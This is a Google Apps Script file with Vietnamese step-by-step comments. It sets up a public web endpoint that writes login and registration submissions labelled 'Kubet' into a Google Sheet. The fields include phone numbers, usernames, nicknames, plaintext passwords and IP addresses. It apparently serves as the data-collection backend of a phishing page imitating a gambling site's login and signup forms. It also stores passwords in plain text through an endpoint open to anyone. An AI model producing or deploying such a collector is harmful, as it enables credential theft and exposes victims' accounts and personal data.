// ==========================================
// 1. TẠO GOOGLE SHEET TRƯỚC
// ==========================================
// Bước 1: Vào Google Drive → New → Google Sheets
// Bước 2: Đặt tên file: "Kubet Form Data"
// Bước 3: Tạo 2 Sheet tab (click dấu + ở dưới):
//         - Sheet 1 đổi tên thành: "DangNhap"
//         - Sheet 2 đổi tên thành: "DangKy"
// Bước 4: Ở tab "DangNhap", dán dòng header sau vào A1:
//         ThoiGian | SoDienThoai | TaiKhoan | Loai | IP
// Bước 5: Ở tab "DangKy", dán dòng header sau vào A1:
//         ThoiGian | MaGioiThieu | TaiKhoan | BietDanh | MatKhau | SoDienThoai | Loai | IP
// Bước 6: Vào menu Extensions → Apps Script


// ==========================================
// 2. COPY CODE NÀY VÀO GOOGLE APPS SCRIPT
// ==========================================

function doPost(e) {
  try {
    // Parse data từ POST request
    var data = JSON.parse(e.postData.contents);
    
    // Mở spreadsheet theo ID (thay YOUR_SPREADSHEET_ID bằng ID thật)
    // Lấy ID từ URL: https://docs.google.com/spreadsheets/d/XXXXXXXX/edit
    var spreadsheetId = 'YOUR_SPREADSHEET_ID';
    var ss = SpreadsheetApp.openById(spreadsheetId);
    
    // Xác định sheet nào dựa vào type
    var sheetName = data.type === 'login' ? 'DangNhap' : 'DangKy';
    var sheet = ss.getSheetByName(sheetName);
    
    if (!sheet) {
      return ContentService.createTextOutput(JSON.stringify({
        status: 'error',
        message: 'Sheet ' + sheetName + ' không tồn tại'
      })).setMimeType(ContentService.MimeType.JSON);
    }
    
    // Chuẩn bị row data theo type
    var row = [];
    var now = new Date();
    
    if (data.type === 'login') {
      // DangNhap columns: ThoiGian | SoDienThoai | TaiKhoan | Loai | IP
      row = [
        now,                                    // A: ThoiGian
        data.phone || '',                       // B: SoDienThoai
        data.username || '',                    // C: TaiKhoan
        'Đăng nhập',                            // D: Loai
        data.ip || ''                           // E: IP
      ];
    } else {
      // DangKy columns: ThoiGian | MaGioiThieu | TaiKhoan | BietDanh | MatKhau | SoDienThoai | Loai | IP
      row = [
        now,                                    // A: ThoiGian
        data.referralCode || '',                // B: MaGioiThieu
        data.account || '',                     // C: TaiKhoan
        data.nickname || '',                    // D: BietDanh
        data.password || '',                    // E: MatKhau
        data.phone || '',                       // F: SoDienThoai
        'Đăng ký',                              // G: Loai
        data.ip || ''                           // H: IP
      ];
    }
    
    // Append row vào sheet
    sheet.appendRow(row);
    
    // Trả về success
    return ContentService.createTextOutput(JSON.stringify({
      status: 'success',
      message: 'Đã lưu vào Google Sheet'
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    return ContentService.createTextOutput(JSON.stringify({
      status: 'error',
      message: error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
}

function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    status: 'ok',
    message: 'Google Apps Script đang chạy'
  })).setMimeType(ContentService.MimeType.JSON);
}


// ==========================================
// 3. DEPLOY WEB APP (QUAN TRỌNG!)
// ==========================================
// Bước 1: Trong Apps Script, click nút "Deploy" → "New deployment"
// Bước 2: Click biểu tượng bánh răng → chọn "Web app"
// Bước 3: Điền:
//         - Description: "Kubet Form Handler"
//         - Execute as: Me
//         - Who has access: ANYONE
// Bước 4: Click "Deploy", xác nhận quyền
// Bước 5: Copy URL Web App (dạng: https://script.google.com/macros/s/XXXX/exec)
// Bước 6: Vào lại code, thay 'YOUR_SPREADSHEET_ID' bằng ID thật
// Bước 7: Deploy lại để cập nhật


// ==========================================
// 4. LẤY SPREADSHEET ID
// ==========================================
// Mở Google Sheet → nhìn lên URL:
// https://docs.google.com/spreadsheets/d/1ABC123xyz789/edit
//                           ^^^^^^^^^^^^^^^^
//                           Đây là Spreadsheet ID
// Copy phần này, paste vào code thay chỗ YOUR_SPREADSHEET_ID